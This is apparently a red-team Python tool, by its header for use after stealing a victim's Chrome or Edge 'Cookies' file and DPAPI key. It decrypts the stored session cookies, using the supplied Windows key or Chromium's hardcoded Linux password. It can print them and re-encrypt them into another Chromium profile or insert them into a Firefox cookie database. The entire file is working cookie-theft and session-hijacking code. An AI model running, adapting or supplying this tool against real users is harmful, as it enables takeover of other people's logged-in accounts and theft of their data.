#!/usr/bin/env python3
#
# Author: Lorenzo Bernardi (@fastlorenzo)
#
# Inspired by:
# - https://gist.github.com/GramThanos/ff2c42bb961b68e7cc197d6685e06f10
# - https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc
# - https://github.com/crypt0p3g/bof-collection
# - https://github.com/rxwx/chlonium
# - https://gist.github.com/microo8/d0ecb52ec592971a466a3189287631c7
# - https://n8henrie.com/2013/11/use-chromes-cookies-for-easier-downloading-with-python-requests/
# 
# Use Chlonium (or another technique) to steal the Cookies file of edge/chrome, as well as the corresponding decrytion key (via DPAPI)
#

import sqlite3
import sys
import argparse
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import pad
from pprint import pprint
import base64

# Values for Chromium on Linux
LINUX_SALT = b'saltysalt'
LINUX_IV = b' ' * 16
LINUX_LEN = 16
LINUX_ITER = 1
# Hardcoded password for Linux
LINUX_KEY = 'peanuts'.encode('utf8')

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)

# Strip padding by taking off number indicated by padding
# eg if last is '\x0e' then ord('\x0e') == 14, so take off 14.
# You'll need to change this function to use ord() for python2.
def clean(x):
	return x[:-x[-1]].decode('utf8')

def chrome_decrypt(encrypted_value, key=None, input_os='windows'):

	if input_os == 'linux':
		# Encrypted cookies should be prefixed with 'v10' according to the
		# Chromium code. Strip it off.
		if encrypted_value[:3] == b'v10':
			encrypted_value = encrypted_value[3:]
		#encrypted_value = encrypted_value[3:]
		#pprint(encrypted_value)


		cipher = AES.new(key, AES.MODE_CBC, IV=LINUX_IV)
		decrypted = cipher.decrypt(encrypted_value)
		decrypted_value = clean(decrypted)
		#pprint('Decrypted: %s' % decrypted)
		#pprint('Decrypted: %s' % unpad(decrypted).decode('utf-8'))
	else:
		decrypted_value = 'DECRYPTION FAILED'
		try:
			cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
			decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:])
		except:
			print('Failed to decrypt')

	return decrypted_value

def export_cookies(input_file, input_key, input_os, domfilter):

    print('%s[+] Decrypting %s with domain filter \'%%%s%%\' (%s)%s' % (bcolors.HEADER, input_file, domfilter, input_os, bcolors.ENDC))
    if input_os == 'windows':
        key = base64.b64decode(input_key)
    else:
        # Generate key from values above
        key = PBKDF2(LINUX_KEY, LINUX_SALT, LINUX_LEN, LINUX_ITER)
    
    if DEBUG:
    	pprint('Using key: %s' % key)

    conn = sqlite3.connect(input_file)
    cur = conn.cursor()
    conn.text_factory = bytes
    sql = 'SELECT creation_utc, host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, encrypted_value, samesite, source_scheme, source_port, is_same_party FROM cookies WHERE host_key LIKE "%{}%"'.format(domfilter)

    cookies = []

    # Execute the query
    cur.execute(sql)

    for creation_utc, host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, encrypted_value, samesite, source_scheme, source_port, is_same_party in cur.fetchall():

        cookie = {
            'creation_utc': creation_utc,
            'host_key': host_key,
            'name': name,
            'value': value,
            'path': path,
            'expires_utc': expires_utc,
            'is_secure': is_secure,
            'is_httponly': is_httponly,
            'last_access_utc': last_access_utc,
            'has_expires': has_expires,
            'is_persistent': is_persistent,
            'priority': priority,
            'encrypted_value': encrypted_value,
            'samesite': samesite,
            'source_scheme': source_scheme,
            'source_port': source_port,
            'is_same_party': is_same_party,
            'decrypted_value': None
        }
		
        # if there is a not encrypted value or if the encrypted value
        # doesn't start with the 'v10' prefix, return v
        if value or (encrypted_value[:3] != b'v10'):
            if DEBUG or OUTPUT_COOKIE_VALUE:
                print('[%s%s%s][%s%s%s] non-encrypted value: %s%s%s' % (bcolors.OKCYAN, host_key.decode('utf-8'), bcolors.ENDC, bcolors.OKBLUE, name.decode('utf-8'), bcolors.ENDC, bcolors.OKGREEN, value.decode('utf-8'), bcolors.ENDC))
            cookie['decrypted_value'] = value
            cookies.append(cookie)
        else:
            if DEBUG:
                print('ENCRYPTED [%s%s%s][%s%s%s] %s%s%s' % (bcolors.OKCYAN, host_key.decode('utf-8'), bcolors.ENDC, bcolors.OKBLUE, name.decode('utf-8'), bcolors.ENDC, bcolors.WARNING, encrypted_value.decode('utf-8'), bcolors.ENDC))
            decrypted_tuple = (name, chrome_decrypt(encrypted_value, key, input_os))
            if DEBUG or OUTPUT_COOKIE_VALUE:
                print('DECRYPTED [%s%s%s][%s%s%s] %s%s%s' % (bcolors.OKCYAN, host_key.decode('utf-8'), bcolors.ENDC, bcolors.OKBLUE, name.decode('utf-8'), bcolors.ENDC, bcolors.OKGREEN, decrypted_tuple[1].decode('utf-8'), bcolors.ENDC))
            cookie['decrypted_value'] = decrypted_tuple[1]
            cookies.append(cookie)

    conn.commit()
    conn.close()

    return cookies

def import_cookies_chromium(cookies, output_file, output_key, output_os, domfilter):
    print('%s[+] [Chromium] Re-encrypting cookies with domain filter \'%%%s%%\' (%s) and exporting them to %s%s' % (bcolors.HEADER, domfilter, output_os, output_file, bcolors.ENDC))

    if output_os == 'windows':
        key = base64.b64decode(output_key)
    else:
        # Generate key from values above
        key = PBKDF2(LINUX_KEY, LINUX_SALT, LINUX_LEN, LINUX_ITER)

    if DEBUG:
    	print('Using key: %s' % key)

    conn = sqlite3.connect(output_file)
    cur = conn.cursor()
    conn.text_factory = bytes

    print('%s[!] Deleting previous cookies%s' % (bcolors.WARNING, bcolors.ENDC))
    # First, delete all related cookies from the destination file
    sql = 'DELETE FROM cookies WHERE host_key LIKE "%{}%"'.format(domfilter)
    cur.execute(sql)
    conn.commit()

    # For each cookies, inject them
    for cookie in cookies:

        # Encrypt the value
        cipher = AES.new(key, AES.MODE_CBC, IV=LINUX_IV)
        encrypted = cipher.encrypt(pad(cookie['decrypted_value'].decode('utf-8')).encode())
        cookie['encrypted_value'] = b'v10' + encrypted

        f_cookie = (
            cookie['creation_utc'],
            cookie['host_key'].decode('utf-8'),
            cookie['name'].decode('utf-8'),
            '',
            cookie['path'],
            cookie['expires_utc'],
            cookie['is_secure'],
            cookie['is_httponly'],
            cookie['last_access_utc'],
            cookie['has_expires'],
            cookie['is_persistent'],
            cookie['priority'],
            cookie['encrypted_value'],
            cookie['samesite'],
            cookie['source_scheme'],
            cookie['source_port'],
            cookie['is_same_party']
        )
        sql = 'INSERT INTO cookies(creation_utc, host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, encrypted_value, samesite, source_scheme, source_port, is_same_party) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
        cur = conn.cursor()
        if DEBUG or OUTPUT_COOKIE_VALUE:
            print('IMPORTING [%s%s%s][%s%s%s] %s%s%s' % (bcolors.OKCYAN, cookie['host_key'].decode('utf-8'), bcolors.ENDC, bcolors.OKBLUE, cookie['name'].decode('utf-8'), bcolors.ENDC, bcolors.WARNING, cookie['decrypted_value'].decode('utf-8'), bcolors.ENDC))
        cur.execute(sql, f_cookie)
        conn.commit()

def import_cookies_firefox(cookies, output_file, domfilter):
    print('%s[+] [Firefox] Selected cookies with domain filter \'%%%s%%\' and exporting them to %s%s' % (bcolors.HEADER, domfilter, output_file, bcolors.ENDC))

    conn = sqlite3.connect(output_file)
    cur = conn.cursor()
    conn.text_factory = bytes

    print('%s[!] Deleting previous cookies%s' % (bcolors.WARNING, bcolors.ENDC))
    # First, delete all related cookies from the destination file
    sql = 'DELETE FROM moz_cookies WHERE host LIKE "%{}%"'.format(domfilter)
    cur.execute(sql)
    conn.commit()

    # For each cookies, inject them
    for cookie in cookies:

        f_cookie = (
            cookie['name'].decode('utf-8'),
            cookie['decrypted_value'].decode('utf-8'),
            cookie['host_key'].decode('utf-8'),
            cookie['path'],
            #converting webkit timestamp to unix/firefox timestamp
            max((int(cookie['expires_utc']))-11644473600000000,0),
            max((int(cookie['last_access_utc']))-11644473600000000,0),
            max((int(cookie['last_access_utc']))-11644473600000000,0),
            cookie['is_secure'],
            cookie['is_httponly'],
            0,
            cookie['samesite'],
            cookie['samesite'],
            0
        )
        sql = 'INSERT INTO moz_cookies(name, value, host, path, expiry, lastAccessed, creationTime, isSecure, isHttpOnly, inBrowserElement, sameSite, rawSameSite) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
        cur = conn.cursor()
        if DEBUG or OUTPUT_COOKIE_VALUE:
            print('IMPORTING [%s%s%s][%s%s%s] %s%s%s' % (bcolors.OKCYAN, cookie['host_key'].decode('utf-8'), bcolors.ENDC, bcolors.OKBLUE, cookie['name'].decode('utf-8'), bcolors.ENDC, bcolors.WARNING, cookie['decrypted_value'].decode('utf-8'), bcolors.ENDC))
        cur.execute(sql, f_cookie)
        conn.commit()

def check_args():
    parser = argparse.ArgumentParser(description='Decrypt chrome|edge Cookies file and re-encrypt it with a different key')
    parser.add_argument('--infile', metavar='<infile>', dest='infile', help='Cookies input file', default='Cookies')
    parser.add_argument('--inos', metavar='<inos>', dest='inos', help='Input file OS (windows|linux)', default='windows')
    parser.add_argument('--inkey', metavar='<inkey>', dest='inkey', help='Input file key', default='')
    parser.add_argument('--outos', metavar='<outos>', dest='outos', help='Output file OS (windows|linux)', default='linux')
    parser.add_argument('--outfile', metavar='<outfile>', dest='outfile', help='Cookies output file')
    parser.add_argument('--outkey', metavar='<outkey>', dest='outkey', help='Output file key', default='')
    parser.add_argument('--domain', metavar='<domain>', dest='domain', help='Cookies domain filter', default='')
    parser.add_argument('--debug', action='store_true', help='Enable debug output', default=False)
    parser.add_argument('--output', action='store_true', help='Ouput cookie value', default=False)

    args = parser.parse_args()

    if args.inos == 'windows' and not args.inkey:
        print('[X] Must provide input key for Windows input OS (--inkey <KEY>)')
        parser.print_help()
        sys.exit(-1)

    if args.outos == 'windows' and not args.outkey:
        print('[X] Must provide output key for Windows output OS (--outkey <KEY>)')
        parser.print_help()
        sys.exit(-1)

    if not args.infile:
        print('[X] Missing input file path (--infile <path/Cookies>)')
        parser.print_help()
        sys.exit(-1)

    return args

if __name__ == '__main__':

    # Parse the arguments
    args = check_args()

    global DEBUG, OUTPUT_COOKIE_VALUE

    DEBUG = True if args.debug == True else False
    OUTPUT_COOKIE_VALUE = True if args.output == True else False

    # Decrypt the cookies from the source file
    cookies = export_cookies(args.infile, args.inkey, args.inos, args.domain)

    # If an output file is provided, import the cookies in the store
    if args.outfile:
        if '.sqlite' in args.outfile:
            #outfile contains .sqlite so assuming Firefox cookie database
            import_cookies_firefox(cookies, args.outfile, args.domain)
        else:
            #Chromium cookie database
            import_cookies_chromium(cookies, args.outfile, args.outkey, args.outos, args.domain)

    print('%s[+] Done%s' % (bcolors.HEADER, bcolors.ENDC))
